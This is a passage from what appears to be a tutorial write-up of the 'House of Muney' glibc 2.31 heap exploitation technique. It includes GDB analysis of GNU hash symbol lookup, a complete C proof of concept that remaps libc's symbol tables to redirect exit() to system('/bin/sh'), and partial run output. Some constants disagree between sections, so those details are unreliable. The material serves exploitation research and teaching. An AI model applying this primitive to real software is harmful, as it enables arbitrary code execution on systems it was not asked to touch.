+hasharr = (Elf32_Word *)0x7ffff7dd0b64 + 0x86
+        = 0x7ffff7dd0d7c
+
+Inspecting this value in GDB:
+
+pwndbg> p/x $libc->l_gnu_chain_zero
+$16 = 0x7ffff7dd0b64
+
+pwndbg> set $hasharr = (Elf32_Word *)$libc->l_gnu_chain_zero
+
+pwndbg> p/x *($hasharr + 0x86)
+$17 = 0x7c93f2a0
+
+pwndbg> x/gx ($hasharr + 0x86)
+0x7ffff7dd0d7c: 0x7c967e3e7c93f2a0
+
+It truncates the 64-bit entry to 32-bit
+Elf32_Wordfor comparison:
+
+Follow the trail and step into the branch where glibc evaluates
+(*hasharr ^ new_hash) >> 1— this is the core validation before attempting a match:
+
+This corresponds to:
+
+if (((*hasharr ^ new_hash) >> 1) == 0)
+
+Here we can step back, and see what happens during the check:
+
+RAX = 0x7c93f2a0     ; current `Elf32_Word`
+RBP = 0x7c967e3f     ; new_hash caculated by _dl_new_hash() for "exit"
+RAX xor RBP = 0x58C9F
+shr 1 != 0
+
+The first check fails.
+
+Then it goes back to the instruction at
+do_lookup_x+864, and loads the next
+Elf32_Wordafter
+0x7c93f2a0— namely the hash value of
+0x7c967e3e, which is actually embedded in a 64-bit value
+0x7c967e3e7c93f2a0at memory address
+0x7ffff7dd0d7c.
+
+This time, it matches the
+new_hashand successfully bypasses the XOR check:
+
+This is the true hit — and it's how the resolver selects
+.dynsym[135].
+
+Backtrack slightly before
+do_lookup_xis called — let's confirm that
+new_hashcame from
+_dl_lookup_symbol_x:
+
+► 0x7ffff7fdb1ec <_dl_lookup_symbol_x+284>    call   do_lookup_x                <do_lookup_x>
+	rdi: 0x55555555447b ◂— 0x635f5f0074697865 /* 'exit' */
+	rsi: 0x7c967e3f
+	rdx: 0x7fffffffdfc0 ◂— 0xffffffff
+	rcx: 0x555555554428 ◂— 0x120000000b /* '\x0b' */
+	r8: 0x7fffffffdfd0 ◂— 0x0
+	r9: 0x7ffff7ffe450 —▸ 0x7ffff7fc1520 —▸ 0x7ffff7ffe190 —▸ 0x555555554000 ◂—       0x10102464c457f
+	arg[6]: 0x0
+	arg[7]: 0x7ffff7fc1570 —▸ 0x5555555544a1 ◂— 'GLIBC_2.2.5'
+	arg[8]: 0x1
+	arg[9]: 0x0
+	arg[10]: 0x1
+	arg[11]: 0x7ffff7ffe190 —▸ 0x555555554000 ◂— 0x10102464c457f
+
+The
+rsiis the argument that holds the GNU hash (
+new_hash = 0x7c967e3f) for
+exit.
+
+The
+new_hashis calculated via
+_dl_new_hashat the start of
+_dl_lookup_symbol_xat line 842 for glibc 2.31:
+
+C
+
+lookup_t
+_dl_lookup_symbol_x (const char *undef_name, struct link_map *undef_map,
+		     const ElfW(Sym) **ref,
+		     struct r_scope_elem *symbol_scope[],
+		     const struct r_found_version *version,
+		     int type_class, int flags, struct link_map *skip_map)
+{
+  const uint_fast32_t new_hash = dl_new_hash (undef_name);
+[...]
+
+This GNU hash function (
+gnu_hash()calling
+_dl_new_hash) used in glibc 2.31 is defined in
+<dl-lookup.c>at line 579 :
+
+C
+
+static uint_fast32_t
+dl_new_hash (const char *s)
+{
+  uint_fast32_t h = 5381;
+  for (unsigned char c = *s; c != '\0'; c = *++s)
+    h = h * 33 + c;
+  return h & 0xffffffff;
+}
+
+So we can compute the hash for the symbol string
+"exit"as:
+
+C
+
+// hash = 5381
+// step1: h = 5381 * 33 + 'e' = 5381 * 33 + 101 = 177674
+// step2: h = 177674 * 33 + 'x' = 177674 * 33 + 120 = 5863354
+// step3: h = 5863354 * 33 + 'i' = 5863354 * 33 + 105 = 193490787
+// step4: h = 193490787 * 33 + 't' = 193490787 * 33 + 116 = 6385196071
+
+// Apply 32-bit truncation:
+dl_new_hash("exit") = 6385196071 & 0xffffffff = 0x7c967e3f
+
+Confirmed. It's the exact value we saw used in the
+hasharrwalk.
+
+Additionally, this is much simpler than the 2.41 version , which introduced batching and instruction-level reassociation barriers, defined in a separate file dl-new-hash.h .
+
+Step back in earlier stage, this is where it calculates the
+new_hashvalue for
+"exit", calling the
+in-line dl_new_hash:
+
+Remember, the
+bucketfor
+"exit"was initially
+0x86— but the actual match occurs at index
+0x87, which aligns with the symbol index
+135. This is the value ultimately compared inside
+hasharrduring the resolution loop.
+
+PoC
+
+The logic behind exploiting House of Muney is straightforward — the real challenge lies in reconstructing the precise values within the hijacked memory regions tied to symbol resolution , particularly the
+.gnu.hashsection.
+
+Since we've already dissected the internals and resolution flow in earlier sections, we can now surgically repopulate those values into our PoC.
+
+Alternatively, a lazier route would be to dump the entire
+.gnu.hashsection and tweak only the few bytes critical to triggering our exploit. That works — but it sidesteps the deeper understanding of what makes House of Muney tick.
+
+PoC | Glibc 2.31
+
+Environment
+
+$ /lib/x86_64-linux-gnu/libc.so.6
+
+GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31.
+Copyright (C) 2020 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.
+There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
+PARTICULAR PURPOSE.
+Compiled by GNU CC version 9.4.0.
+libc ABIs: UNIQUE IFUNC ABSOLUTE
+For bug reporting instructions, please see:
+<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
+
+Needed Constants
+
+Function Offsets
+
+$ readelf -s /lib/libc.so.6 | grep ' puts'
+237: 0000000000082360   518 FUNC    WEAK   DEFAULT   14 puts@@GLIBC_2.2.5
+
+$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep ' printf'
+639: 0000000000061c90   204 FUNC    GLOBAL DEFAULT   15 printf@@GLIBC_2.2.5
+
+$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep ' system'
+1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
+
+$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep ' exit'
+135: 0000000000046a40    32 FUNC    GLOBAL DEFAULT   15 exit@@GLIBC_2.2.5
+
+$ objdump -s -j .gnu.hash /lib/x86_64-linux-gnu/libc.so.6 | head
+
+/lib/x86_64-linux-gnu/libc.so.6:     file format elf64-x86-64
+
+Contents of section .gnu.hash:
+03b8 f3030000 0c000000 00010000 0e000000  ................
+03c8 00301044 a0200201 8803e690 c5458c00  .0.D. .......E..
+03d8 c4005800 07840070 c280010d 8a0c4104  ..X....p......A.
+03e8 10008840 32082a40 88543c2d 200e3248  ...@2.*@.T<- .2H
+03f8 2684c08c 04080002 020ea1ac 1a0666c8  &.............f.
+0408 00c03200 c0045009 20810884 0b202028  ..2...P. ....  (
+
+Target Offsets
+
+For symbol resolution-related offsets that we plan to hijack, we can extract them via GDB as follows:
+
+// Look up libc link_map
+pwndbg> set $m = (struct link_map *)((struct r_debug *)&_r_debug)->r_map
+
+pwndbg> set $libc = $m->l_next->l_next
+
+pwndbg> p $libc->l_name
+$1 = 0x7ffff7ffee10 "/lib/x86_64-linux-gnu/libc.so.6"
+
+// Locate .dynsym for "exit"
+pwndbg> set $dynsym = (Elf64_Sym *)$libc->l_info[6]->d_un.d_ptr
+
+pwndbg> p/x $dynsym
+$2 = 0x7ffff7dd3070
+
+pwndbg> set $exit_sym = $dynsym + 135
+
+pwndbg> p/x $exit_sym->st_value
+$3 = 0x46a40
+
+pwndbg> x/s ($exit_sym->st_name + $libc->l_info[5]->d_un.d_ptr)
+0x7ffff7de3d9b: "exit"
+
+// GNU hash tables
+pwndbg> p/x $libc->l_gnu_bitmask
+$4 = 0x7ffff7dcf3c8
+
+pwndbg> p/x $libc->l_gnu_buckets
+$5 = 0x7ffff7dcfbc8
+
+pwndbg> p/x $libc->l_gnu_chain_zero
+$6 = 0x7ffff7dd0b64
+
+pwndbg> set $bitmask = $libc->l_gnu_bitmask
+
+pwndbg> set $buckets = $libc->l_gnu_buckets
+
+pwndbg> set $chain_zero = $libc->l_gnu_chain_zero
+
+// Libc offsets
+pwndbg> libc
+libc : 0x7ffff7dcf000
+
+pwndbg> set $libc_base = 0x7ffff7dcf000
+
+pwndbg> dist $libc_base $dynsym
+0x7ffff7dcf000->0x7ffff7dd3070 is 0x4070 bytes (0x80e words)
+
+pwndbg> dist $libc_base $bitmask
+0x7ffff7dcf000->0x7ffff7dcf3c8 is 0x3c8 bytes (0x79 words)
+
+pwndbg> dist $libc_base $buckets
+0x7ffff7dcf000->0x7ffff7dcfbc8 is 0xbc8 bytes (0x179 words)
+
+pwndbg> dist $libc_base $chain_zero
+0x7ffff7dcf000->0x7ffff7dd0b64 is 0x1b64 bytes (0x36c words)
+
+Symbol Table
+
+Inspect the
+.dynsymentry for
+"exit":
+
+C
+
+pwndbg> ptype /o $exit_sym
+type = struct {
+/*      0      |       4 */    Elf64_Word st_name;
+/*      4      |       1 */    unsigned char st_info;
+/*      5      |       1 */    unsigned char st_other;
+/*      6      |       2 */    Elf64_Section st_shndx;
+/*      8      |       8 */    Elf64_Addr st_value;
+/*     16      |       8 */    Elf64_Xword st_size;
+
+                    	/* total size (bytes):   24 */
+                    } *
+
+This confirms each symbol entry is 24 bytes (
+0x18).
+
+Dump fields:
+
+pwndbg> p/x $exit_sym->st_name
+$7 = 0x2efb
+
+pwndbg> p/x $exit_sym->st_info
+$8 = 0x12
+
+pwndbg> p/x $exit_sym->st_other
+$9 = 0x0
+
+pwndbg> p/x $exit_sym->st_shndx
+$10 = 0xf
+
+pwndbg> p/x $exit_sym->st_value
+$11 = 0x46a40
+
+pwndbg> p/x $exit_sym->st_size
+$12 = 0x20
+
+pwndbg> x/3gx $exit_sym
+0x7ffff7dd3d18: 0x000f001200002efb      0x0000000000046a40
+0x7ffff7dd3d28: 0x0000000000000020
+
+All consistent with prior analysis ( Anchor: .dynsym members ).
+
+With our understanding of the resolution algorithm from the previous sections ( Anchor: Look Inside ), we can now reconstruct or forge the required
+.dynsymentries for any target symbol — not just
+exit.
+
+Others
+
+Additionally, we can retrieve other variables related to the
+"exit"symbol from previous demo section:
+
+bitmask_word
+
+Given:
+
+new_hash = 0x7c967e3f   // gnu_hash("exit")
+
+Then:
+
+index = (new_hash / 64) & l_gnu_bitmask_idxbits
+      = (0x7c967e3f / 0x40) & 0xff
+      = 0x1f259f8 & 0xff
+      = 0xf8
+
+Final address:
+
+bitmask_word_addr = libc_base + bitmask_offset + 0xf8 * 8
+
+We recover the required 8-byte value from GDB:
+
+[bitmask_word_addr] = 0xf000028c2200930ea
+
+bucket
+
+Per source:
+
+Elf32_Word bucket = map->l_gnu_buckets[new_hash
+                 		% map->l_nbuckets];
+
+Given:
+
+nbuckets = 0x3f3 = 1011
+new_hash = 0x7c967e3f	// dl_new_hash("exit")
+
+map->l_nbucketsis stored in the
+link_mapstructure — it defines the number of buckets in the GNU hash table.
+
+Compute the bucket index :
+
+bucket_index = new_hash % l_nbuckets
+             = 0x7c967e3f % 0x3f3
+             = 58 = 0x3a
+
+Index the bucket array to get
+bucket:
+
+bucket = map->l_gnu_buckets[bucket_index]
+       = map->l_gnu_buckets[0x3a]
+       = 0x86
+
+hasharr
+
+Per source:
+
+const Elf32_Word *hasharr = &map->l_gnu_chain_zero[bucket];
+
+l_gnu_chain_zero: base pointer to the chain array → This is an array of
+Elf32_Word(
+uint32_t)
+
+bucket: an integer index (retrieved from
+l_gnu_buckets[gnu_hash % nbuckets])
+
+That means:
+
+&hasharr[bucket] = l_gnu_chain_zero + bucket * 4;
+				         = l_gnu_chain_zero + 0x86 * 4
+
+It then walks a linear probing chain to match against the computed
+new_hash:
+
+C
+
+do {
+    if (((*hasharr ^ new_hash) >> 1) == 0) {
+        // MATCH!
+        symidx = ELF_MACHINE_HASH_SYMIDX(map, hasharr);
+        // ...
+    }
+} while ((*hasharr++ & 1u) == 0);
+
+To meet the match condition, we need to make:
+
+(*hasharr ^ new_hash) == 1
+
+This is equivalent to:
+
+*hasharr = new_hash ^ 1
+		     = _dl_new_hash("exit") ^ 1
+      	 = 0x7c967e3f ^ 1
+		     = 0x7c967e3e
+
+In GDB, we confirmed that before the matching entry, another 4-byte word (
+0x7c93f2a0) was present — the loop just skips over it. Then
+0x7c967e3ehits the hash match, allowing glibc to resolve
+"exit"to the symbol index we hijacked.
+
+Therefore, we need to populate this value into the
+l_gnu_chain_zeroarray with the true
+bucket— 0x87 — not 0x86.
+
+PoC Script
+
+C
+
+/*
+ * Title   : PoC for House of Muney
+ * Author  : Axura
+ * Lab	   : glibc-2.31-0ubuntu9.9 (Ubuntu 20.04)
+ * Website : https://4xura.com/pwn/heap/house-of-muney/
+ * Compile : gcc -Wl,-z,lazy -g -o house_of_muney_glibc-2.31 house_of_muney_glibc-2.31.c
+ *           (Some system may apply NOW to pre-resolve all symbols in libc by default,
+ *			     So we can use the `-z,lazy` flag in compilation to enable lazy binding)
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/mman.h>
+
+// These offsets are libc-specific
+#define PUTS_OFFSET			  0x84420
+#define SYSTEM_OFFSET		  0x52290
+#define BITMASK_OFFSET		0x3c8
+#define BUCKETS_OFFSET		0xbc8
+#define CHAIN_ZERO_OFFSET	0x1b64
+#define DYNSYM_OFFSET		  0x4070    	// .dynsym start
+#define EXIT_STR_OFFSET		0x2efb		  // string "exit" offset in .dynstr, for sym->st_name
+#define EXIT_SYM_INDEX		0X87		    // 135, true bucket
+
+// Extract from GDB or retrieve in script before unmapped
+#define BITMASK_WORD		  0xf000028c2200930e
+#define BUCKET				    0x86		    // bucket to start iterate
+#define NBUCKETS			    0x3f3
+
+// These values are fixed for Elf64_Sym structure in 64-bit system
+#define ST_VALUE_OFFSET		0x8
+#define ST_SIZE				    0x18
+
+// Values of the members in symbol table for hijaced target
+#define ELF64_ST_INFO(bind, type) (((bind) << 4) | ((type) & 0x0F)) // Construct st_info from binding and type
+#define STB_GLOBAL        1           // "exit" is global symbol
+#define STT_FUNC          2           // "exit" is a code object
+#define STV_DEFAULT	      0           // "exit" is default-visible, globally exported function
+#define SHN_EXIT          0x000f      // "exit" is defined in section #15
+#define SIZE_EXIT         0x20        // size for "exit" instructions is close to 0x20
+
+// Calculated hash for symbol (use new hash method from dl-new-hash.h for latest glibc release)
+#define NEW_HASH			    0x7c967e3f	// dl_new_hash("exit")
+
+uintptr_t leak_libc_base() {
+    uintptr_t puts_addr = (uintptr_t)puts;
+    printf("[*] puts@libc = %p\n", (void *)puts_addr);
+
+    uintptr_t libc_base = puts_addr - PUTS_OFFSET;
+    printf("[*] Computed libc base = %p\n", (void *)libc_base);
+
+    return libc_base;
+}
+
+int main() {
+    setbuf(stdin, NULL);
+    setbuf(stdout, NULL);
+    setbuf(stderr, NULL);
+
+    /* Command string to execute */
+    char *cmd = mmap((void *)0xdeadb000, 0x1000, PROT_READ | PROT_WRITE,
+                       MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+    strcpy(cmd, "/bin/sh");
+
+    /* House of Muney */
+    printf("[*] Demonstrating munmap overlap exploitation via mmap chunks\n\n");
+
+    printf("[*] Step 1: Allocate a super-large chunk using malloc() → triggering mmap()\n");
+    size_t *victim_ptr = malloc(0x30000);
+    printf("[+] Victim chunk allocated at: %p (below libc), size: 0x%lx\n", victim_ptr-2, victim_ptr[-1]);
+
+    printf("\n");
+
+    puts("[*] Simulated high-to-low memory layout:\n"
+         "    ld.so\n"
+         "    ...\n"
+         "    libc\n"
+         "    victim chunk\n"
+         "    ...\n"
+         "    heap\n");
+
+    /*
+     * - Mappings
+     *                           Start                End Perm     Size Offset File
+     *                  0x555555557000     0x555555558000 r--p     1000   2000 /home/axura/hacker/house_of_muney_glibc-2.31
+     *                  0x555555558000     0x555555559000 rw-p     1000   3000 /home/axura/hacker/house_of_muney_glibc-2.31
+     *                  0x555555559000     0x55555557a000 rw-p    21000      0 [heap]
+     *   mmap chunk ➤  0x7ffff7d9e000     0x7ffff7dcf000 rw-p    31000      0 [anon_7ffff7d9e]
+     *       Hijack ➤  0x7ffff7dcf000     0x7ffff7df1000 r--p    22000      0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
+     *                  0x7ffff7df1000     0x7ffff7f69000 r-xp   178000  22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
+     *                  0x7ffff7f69000     0x7ffff7fb7000 r--p    4e000 19a000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
+     *
+     *  - Target libc Internal
+     *
+     *              0x00007ffff7dcf350 - 0x00007ffff7dcf370 is .note.gnu.property in /lib/x86_64-linux-gnu/libc.so.6
+     *              0x00007ffff7dcf370 - 0x00007ffff7dcf394 is .note.gnu.build-id in /lib/x86_64-linux-gnu/libc.so.6
+     *              0x00007ffff7dcf394 - 0x00007ffff7dcf3b4 is .note.ABI-tag in /lib/x86_64-linux-gnu/libc.so.6
+     *              0x00007ffff7dcf3b8 - 0x00007ffff7dd306c is .gnu.hash in /lib/x86_64-linux-gnu/libc.so.6
+     *              0x00007ffff7dd3070 - 0x00007ffff7de0ea0 is .dynsym in /lib/x86_64-linux-gnu/libc.so.6
+     *              0x00007ffff7de0ea0 - 0x00007ffff7de6f61 is .dynstr in /lib/x86_64-linux-gnu/libc.so.6
+     *              0x00007ffff7de6f62 - 0x00007ffff7de81e6 is .gnu.version in /lib/x86_64-linux-gnu/libc.so.6
+     */
+
+    printf("[*] Step 2: Corrupt size field of the victim chunk to cover libc parts\n");
+
+    size_t libc_overwrite_size = 0x10000;  // target region (.gnu.hash/.dynsym)
+    size_t victim_size = (victim_ptr)[-1];
+
+    size_t fake_size = (victim_size + libc_overwrite_size) & ~0xfff;
+    fake_size |= 0b10;  // Preserve IS_MMAPPED bit
+
+    victim_ptr[-1] = fake_size;
+    printf("[+] Updated victim_size chunk size to: 0x%lx\n", victim_ptr[-1]);
+
+    printf("\n");
+
+    printf("[*] Step 3: Free corrupted victim chunk → triggers munmap on both chunks and libc area\n");
+
+    void *munmap_start = (void *)(victim_ptr - 2);
+    void *munmap_end   = (void *)((char *)munmap_start + (fake_size & ~0x7));
+    printf("[*] munmap will unmap: %p → %p (size: 0x%lx)\n", munmap_start, munmap_end, fake_size);
+
+    free(victim_ptr);
+    printf("[+] Victim chunk has now been freed\n");
+    printf("[!] .gnu.hash and .dynsym are now unmapped. New symbol resolutions will fail!\n");
+
+    /*
+     *  - For mmap chunks, glibc malloc directly calls munmap() on free().
+     *
+     *  - Unlike normal heap chunks (which become UAF), a munmapped chunk
+     *    is fully returned to the kernel and becomes inaccessible.
+     *
+     *  - If we try accessing the freed mmap memory, it causes a segfault.
+     *
+     *  - Our goal is to reclaim this unmapped memory by issuing a new
+     *    malloc() that overlaps the freed area — effectively overlapping
+     *    a new mmap chunk over libc, including .dynsym and .gnu.hash.
+     *
+     *  - WARNING: Any new dynamically resolved function (like assert(), etc.)
+     *    will crash if its symbol isn't already resolved before the munmap.
+     *    This is because symbol resolution related sections are now GONE.
+     *
+     *  => Now we will reallocate the freed chunk and write our symbol resolution
+     *     logic on the hijacked sections
+     */
+
+    printf("\n");
+
+    printf("[*] Step 4: Reallocate a larger overlapping mmap chunk to reclaim unmapped area\n");
+    size_t *overlap_ptr = malloc(0x100000);  // large enough to overlap munmapped region
+
+    size_t overlap_start = overlap_ptr - 2;
+    size_t overlap_size  = overlap_ptr[-1] & ~0xfff;
+    size_t overlap_end   = overlap_start + overlap_size;
+
+    printf("[+] Overlapping chunk start : %p\n", overlap_start);
+    printf("[+] Overlapping chunk end   : %p\n", overlap_end);
+    printf("[+] Overlapping chunk size  : 0x%lx\n", overlap_size);
+
+    printf("\n");
+
+    printf("[*] Step 5: Leak libc base address, before overwriting our targets on libc mappings\n");
+    uintptr_t libc_base = leak_libc_base();
+    printf("[+] libc base: %p\n", libc_base);
+
+    printf("\n");
+
+    // check if victim chunk, .gnu.hash, .dynsym (higher) overlapped
+    uintptr_t dynsym_addr = libc_base + DYNSYM_OFFSET;
+    printf("[*] .dynsym section starts at %p\n", dynsym_addr);
+	  printf("[*] Checking overlap covers .dynsym: [%p → %p)\n", (void *)overlap_start, (void *)overlap_end);
+
+	if (!(overlap_start <= dynsym_addr && dynsym_addr < overlap_end)) {
+        const char *msg = "[!] Overlap does not cover .dynsym — aborting\n";
+        write(2, msg, strlen(msg));
+        _exit(1);
+    }
+
+    printf("[✓] We can now rewrite internal glibc sections: .gnu.hash, .dynsym, etc.\n");
+
+    printf("\n");
+
+    printf("[*] Step 6: Calculate offsets of in-libc target addresses to overwrite\n");
+    printf("            Here we simulate to write starting from the allocated victim chunk\n");
+    printf("            So we will calculate the offsets of the targets to the overlapped chunk\n");
+    printf("            Start writing from the entry at: %p\n", overlap_ptr);
+
+    uint64_t write_to_libc_offset	= (uint64_t)libc_base - (uint64_t)overlap_ptr;
+    uint64_t bitmask_word_offset	= BITMASK_OFFSET + ((NEW_HASH / 0x40) & 0xff) * 8;	// bitmask_word for "exit"
+    uint32_t bucket_index 			  = NEW_HASH % NBUCKETS;	// bucket index for "exit" (0xc4)
+    uint64_t bucket_offset			  = BUCKETS_OFFSET + bucket_index * 4;	// bucket for "exit"
+    uint64_t hasharr_offset			  = CHAIN_ZERO_OFFSET + BUCKET * 4;	// hasharr[i] for "exit"
+
+    uint64_t bitmask_word_addr  = (uint64_t)overlap_ptr + write_to_libc_offset + bitmask_word_offset;
+    uint64_t bucket_addr		    = (uint64_t)overlap_ptr + write_to_libc_offset + bucket_offset;
+    uint64_t hasharr_addr		    = (uint64_t)overlap_ptr + write_to_libc_offset + hasharr_offset;
+    uint64_t exit_symtab_addr	  = (uint64_t)overlap_ptr + write_to_libc_offset + DYNSYM_OFFSET + EXIT_SYM_INDEX * ST_SIZE;	// [!] Hijack
+
+    printf("[+] bitmask_word addr: %p\n", (void *)bitmask_word_addr);
+    printf("[+] bucket addr:       %p\n", (void *)bucket_addr);
+    printf("[+] hasharr addr:      %p\n", (void *)hasharr_addr);
+    printf("[+] exit@dynsym addr:  %p\n", (void *)exit_symtab_addr);
+
+    printf("\n");
+
+    /*
+     *  - When glibc is loaded via ld-linux, its .text, .dynsym, .gnu.hash, etc. sections are mapped as:
+     *    	.text    : r-xp
+     *      .gnu.hash: r--p
+     *    	.dynsym  : r--p
+     *
+     *    They are marked read-only in /proc/self/maps
+	   *
+	   *  - In House of Muney:
+     *    After the munmap() triggered via free(mmap_chunk) releases parts of the libc mapping (like .gnu.hash, .dynsym),
+     *    a subsequent malloc() (which becomes an mmap() internally) reclaims the same virtual memory range.
+     *    But with read-write permissions!
+     *    Because it’s now a fresh anonymous mapping owned by the process, not libc's original read-only mapping.
+     *
+     *  - So, the new mapping is:
+     *       rw-p (read/write/private)
+     *    Because that's what malloc() requests for data chunks.
+     *
+     *  => This is the core primitive behind House of Muney.
+     */
+
+    printf("[*] Step 7: Overwrite glibc's GNU Hash Table related stuff\n");
+
+    *(uint64_t *)bitmask_word_addr = BITMASK_WORD;
+    printf("[+] bitmask_word (%lx) in bitmask[indice] for 'exit' populated @ %p!\n", BITMASK_WORD, bitmask_word_addr);
+
+    *(uint32_t *)bucket_addr = BUCKET;
+    printf("[+] bucket value (%d) in buckets[index]  for 'exit' populated @ %p!\n", BUCKET, bucket_addr);
+
+    /* Hash will be checked at 2nd loop for the "true" bucket 0x87 of exit
+     * And it must be - if we write the hash on the location calculated according to bucket (0x86) - it fails
+     * That's why I describe the index from readelf for "exit" (0x87) is the true bucket
+     */
+    uint32_t hash = NEW_HASH ^ 1;
+    // *(uint32_t *)hasharr_addr = NEW_HASH ^ 1;
+    *((uint32_t *)hasharr_addr + 1) = hash;
+	printf("[+] hasharr value (%d) populated @ %p!\n", hash, hasharr_addr);
+
+    printf("\n");
+
+    /*
+     *  - Exit symbol table and its offset:
+     *
+     *      pwndbg> ptype /o $exit_sym
+     *      type = struct {
+     *           0      |       4     Elf64_Word st_name;       // Offset in .dynstr
+     *           4      |       1     unsigned char st_info;    // Symbol type and binding
+     *           5      |       1     unsigned char st_other;   // Visibility
+     *           6      |       2     Elf64_Section st_shndx;   // Section index
+     *           8      |       8     Elf64_Addr st_value;      // Resolved address (Hijack in exploit)
+     *          16      |       8     Elf64_Xword st_size;      // Size of the object (usually 0 for funcs like exit)
+	   *
+     *                              total size (bytes):   24
+     *                         }
+     */
+
+    printf("[*] Step 8: Patch [.dynsym] to redirect 'exit' to 'system'\n\n");
+
+    typedef struct {
+        uint32_t st_name;     // 0  Offset into .dynstr
+        uint8_t  st_info;     // 4  Type and binding
+        uint8_t  st_other;    // 5  Visibility
+        uint16_t st_shndx;    // 6  Section index
+        uint64_t st_value;    // 8  Symbol value (resolved address)
+        uint64_t st_size;     // 16 Size of the object
+    } Elf64_Sym;
+
+    Elf64_Sym *exit_symbol_table = (Elf64_Sym*)exit_symtab_addr;
+
+    /* Recovery (0xf001200002ef) */
+    printf("[*] Patching st_name with the offset pointing back to exit@dynstr...\n");
+    exit_symbol_table->st_name = EXIT_STR_OFFSET;
+    printf("[+] exit@dynstr → 'exit'\n");
+
+    printf("[*] Patching st_info for typing & binding...\n");
+    uint8_t st_info_val = ELF64_ST_INFO(STB_GLOBAL, STT_FUNC);
+    exit_symbol_table->st_info = st_info_val;  // (0x1 << 4) | 0x2 = 0x12
+    printf("[+] st_info is now patched as 0x%02x\n", st_info_val);
+
+    printf("[*] Patching st_other for symbol visibility...\n");
+    exit_symbol_table->st_other = STV_DEFAULT;  // 0
+    printf("[+] st_other is now patched as 0x%02x\n", STV_DEFAULT);
+
+    printf("[*] Patching st_shndx for telling symbol section index...\n");
+    exit_symbol_table->st_shndx = SHN_EXIT;  // 0x000f
+    printf("[+] st_shndx is now patched as 0x%04x\n", SHN_EXIT);
+
+    printf("[*] Patching st_shndx for telling symbol section index...\n");
+    printf("[*] Though this is not neccessary to populte in House of Muney\n");
+    exit_symbol_table->st_size = SIZE_EXIT;  // 0x20
+    printf("[+] st_shndx is now patched as 0x%016lx\n", SIZE_EXIT);
+
+    printf("\n");
+
+    /* Hijack exit → system */
+    printf("[*] [HIIJACK] Overwrite st_value in the 'exit' symbol table with offset of system func call\n");
+    exit_symbol_table->st_value = SYSTEM_OFFSET;
+    printf("[+] exit@dynsym → system()\n");
+
+    printf("\n");
+
+    printf(
+        "[!] Now the exit .dynsym table structures as:\n\n"
+        "    typedef struct {\n"
+        "        uint32_t st_name;     // Offset into .dynstr   - 0: 0x%x\n"
+        "        uint8_t  st_info;     // Type and binding      - 4: 0x%02x\n"
+        "        uint8_t  st_other;    // Visibility            - 5: 0x%02x\n"
+        "        uint16_t st_shndx;    // Section index         - 6: 0x%04x\n"
+        "        uint64_t st_value;    // Resolved address      - 8: 0x%016lx\n"
+        "        uint64_t st_size;     // Size of the object    - 16: 0x%lx\n"
+        "    } Elf64_Sym;\n\n",
+        EXIT_STR_OFFSET, st_info_val, STV_DEFAULT, SHN_EXIT, SYSTEM_OFFSET, SIZE_EXIT
+    );
+
+    printf("\n");
+
+    printf("[*] Step 9: Trigger symbol resolution for hijacked function\n");
+    printf("[✓] Calling exit(\"/bin/sh\") → now system(\"/bin/sh\")\n");
+    exit((uintptr_t)cmd);
+}
+
+Pwn
+
+Running output:
+
+[*] Demonstrating munmap overlap exploitation via mmap chunks
+
+[*] Step 1: Allocate a super-large chunk using malloc() → triggering mmap()
+[+] Victim chunk allocated at: 0x7d96f586b000 (below libc), size: 0x31002
+
+[*] Simulated high-to-low memory layout:
+    ld.so
+    ...
+    libc
+    victim chunk
+    ...
+    heap
+
+[*] Step 2: Corrupt size field of the victim chunk to cover libc parts
+[+] Updated victim_size chunk size to: 0x41002
+
+[*] Step 3: Free corrupted victim chunk → triggers munmap on both chunks and libc area
+[*] munmap will unmap: 0x7d96f586b000 → 0x7d96f58ac000 (size: 0x41002)
+[+] Victim chunk has now been freed
+[!] .gnu.hash and .dynsym are now unmapped. New symbol resolutions will fail!
+
+[*] Step 4: Reallocate a larger overlapping mmap chunk to reclaim unmapped area
+[+] Overlapping chunk start : 0x7d96f57ab000
+[+] Overlapping chunk end   : 0x7d96f58ac000
+[+] Overlapping chunk size  : 0x101000
+
+[*] Step 5: Leak libc base address, before overwriting our targets on libc mappings
+[*] puts@libc = 0x7d96f5920420
+[*] Computed libc base = 0x7d96f589c000
+[+] libc base: 0x7d96f589c000
+
+[*] .dynsym section starts at 0x7d96f58a0070
+[*] Checking overlap covers .dynsym: [0x7d96f57ab000 → 0x7d96f58ac000)
+[✓] We can now rewrite internal glibc sections: .gnu.hash, .dynsym, etc.
+
+[*] Step 6: Calculate offsets of in-libc target addresses to overwrite
+            Here we simulate to write starting from the allocated victim chunk
+            So we will calculate the offsets of the targets to the overlapped chunk
+            Start writing from the entry at: 0x7d96f57ab010
+[+] bitmask_word addr: 0x7d96f589cb88
+[+] bucket addr:       0x7d96f589ccb0
+[+] hasharr addr:      0x7d96f589dd7c
+[+] exit@dynsym addr:  0x7d96f58a0d18
+
+[*] Step 7: Overwrite glibc's GNU Hash Table related stuff
+[+] bitmask_word (f000028c2200930e) in bitmask[indice] for 'exit' populated @ 0x7d96f589cb88!
+[+] bucket value (134) in buckets[index]  for 'exit' populated @ 0x7d96f589ccb0!
+[+] hasharr value (2090237502) populated @ 0x7d96f589dd7c!
+
+[*] Step 8: Patch [.dynsym] to redirect 'exit' to 'system'
+
+[*] Patching st_name with the offset pointing back to exit@dynstr...
+[+] exit@dynstr → 'exit'
+[*] Patching st_info for typing & binding...
+[+] st_info is now patched as 0x12
+[*] Patching st_other for symbol visibility...
+[+] st_other is now patched as 0x00
+[*] Patching st_shndx for telling symbol section index...
+[+] st_shndx is now patched as 0x000f
+[*] Patching st_shndx for telling symbol section index...
+[*] Though this is not neccessary to populte in House of Muney
+[+] st_shndx is now patched as 0x0000000000000020
+
